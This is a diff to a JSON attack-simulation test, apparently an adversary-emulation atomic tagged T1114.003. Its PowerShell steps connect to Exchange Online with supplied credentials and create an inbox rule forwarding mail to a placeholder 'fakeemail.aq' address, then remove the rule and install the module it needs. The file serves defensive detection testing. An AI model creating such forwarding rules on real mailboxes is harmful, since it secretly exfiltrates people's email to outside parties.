@@ -7,87 +7,87 @@
   ],
   "steps": [
     {
-      "id": "22850ebe-07fc-417a-92ed-b1ba35af3aa3",
+      "id": "d646284d-dab2-4960-b89f-86d87f40cc52",
       "type": "execute-command",
       "data": {
-        "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nNew-InboxRule -Name \"#{rule_name}\" -ForwardTo \"#{forwarding_email}\"\n",
+        "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nNew-InboxRule -Name \"#{rule_name}\" -ForwardTo \"#{forwarding_email}\"",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "ecddfd45-026b-485a-886f-75f6b8e1a92d",
+      "id": "c5a3c840-a752-4055-8c98-bbae586c13d1",
       "type": "execute-command",
       "data": {
-        "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nGet-InboxRule | Where-Object { $_.Name -eq \"#{rule_name}\" | ForEach-Object { Remove-InboxRule -Identity $_.Identity -Force -Confirm:$False }\n",
+        "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nGet-InboxRule | Where-Object { $_.Name -eq \"#{rule_name}\" | ForEach-Object { Remove-InboxRule -Identity $_.Identity -Force -Confirm:$False }",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "8f123d19-b503-455d-b8ee-33bf0b8fc5e9",
+      "id": "c0e1e836-497e-4b50-990b-fc3f7a1e3fb7",
       "name": "Check dependency 1/1",
       "description": "ExchangeOnlineManagement PowerShell module must be installed. Your user must also have an Exchange license. \n",
       "type": "execute-command",
       "data": {
-        "command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n",
-        "command_type": ""
+        "command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}",
+        "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "ebc15f37-452f-41f7-9bb4-3bb9bbcc0da6",
+      "id": "26d46d5e-02cb-4d13-8a9d-549aaad317ef",
       "name": "Resolve dependency 1/1",
       "description": "ExchangeOnlineManagement PowerShell module must be installed. Your user must also have an Exchange license. \n",
       "type": "execute-command",
       "data": {
-        "command": "Install-Module -Name ExchangeOnlineManagement         \nImport-Module ExchangeOnlineManagement\n",
-        "command_type": ""
+        "command": "Install-Module -Name ExchangeOnlineManagement         \nImport-Module ExchangeOnlineManagement",
+        "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "2e63951a-0c45-4b0b-bb22-5b2bdb2904cc",
+      "id": "fbe0d053-49e5-4701-8fc4-6fb8efb97719",
       "name": "Re-check dependency 1/1",
       "description": "ExchangeOnlineManagement PowerShell module must be installed. Your user must also have an Exchange license. \n",
       "type": "execute-command",
       "data": {
-        "command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n",
-        "command_type": ""
+        "command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}",
+        "command_type": "powershell"
       },
       "elevation_required": false
     }
   ],
   "flows": [
     {
-      "s": "22850ebe-07fc-417a-92ed-b1ba35af3aa3",
+      "s": "d646284d-dab2-4960-b89f-86d87f40cc52",
       "p": "on-success",
-      "o": "ecddfd45-026b-485a-886f-75f6b8e1a92d"
+      "o": "c5a3c840-a752-4055-8c98-bbae586c13d1"
     },
     {
-      "s": "22850ebe-07fc-417a-92ed-b1ba35af3aa3",
+      "s": "d646284d-dab2-4960-b89f-86d87f40cc52",
       "p": "on-failure",
-      "o": "ecddfd45-026b-485a-886f-75f6b8e1a92d"
+      "o": "c5a3c840-a752-4055-8c98-bbae586c13d1"
     },
     {
-      "s": "8f123d19-b503-455d-b8ee-33bf0b8fc5e9",
+      "s": "c0e1e836-497e-4b50-990b-fc3f7a1e3fb7",
       "p": "on-success",
-      "o": "22850ebe-07fc-417a-92ed-b1ba35af3aa3"
+      "o": "d646284d-dab2-4960-b89f-86d87f40cc52"
     },
     {
-      "s": "8f123d19-b503-455d-b8ee-33bf0b8fc5e9",
+      "s": "c0e1e836-497e-4b50-990b-fc3f7a1e3fb7",
       "p": "on-failure",
-      "o": "ebc15f37-452f-41f7-9bb4-3bb9bbcc0da6"
+      "o": "26d46d5e-02cb-4d13-8a9d-549aaad317ef"
     },
     {
-      "s": "ebc15f37-452f-41f7-9bb4-3bb9bbcc0da6",
+      "s": "26d46d5e-02cb-4d13-8a9d-549aaad317ef",
       "p": "on-success",
-      "o": "2e63951a-0c45-4b0b-bb22-5b2bdb2904cc"
+      "o": "fbe0d053-49e5-4701-8fc4-6fb8efb97719"
     },
     {
-      "s": "2e63951a-0c45-4b0b-bb22-5b2bdb2904cc",
+      "s": "fbe0d053-49e5-4701-8fc4-6fb8efb97719",
       "p": "on-failure",
-      "o": "22850ebe-07fc-417a-92ed-b1ba35af3aa3"
+      "o": "d646284d-dab2-4960-b89f-86d87f40cc52"
     }
   ],
   "tags": [
@@ -95,18 +95,6 @@
     "T1114.003"
   ],
   "input_arguments": [
-    {
-      "name": "username",
-      "type": "string",
-      "description": "office-365 username",
-      "value": ""
-    },
-    {
-      "name": "password",
-      "type": "string",
-      "description": "office-365 password",
-      "value": ""
-    },
     {
       "name": "rule_name",
       "type": "string",
@@ -118,6 +106,18 @@
       "type": "string",
       "description": "destination email addresses",
       "value": "Atomic_Operator@fakeemail.aq"
+    },
+    {
+      "name": "username",
+      "type": "string",
+      "description": "office-365 username",
+      "value": ""
+    },
+    {
+      "name": "password",
+      "type": "string",
+      "description": "office-365 password",
+      "value": ""
     }
   ]
 }
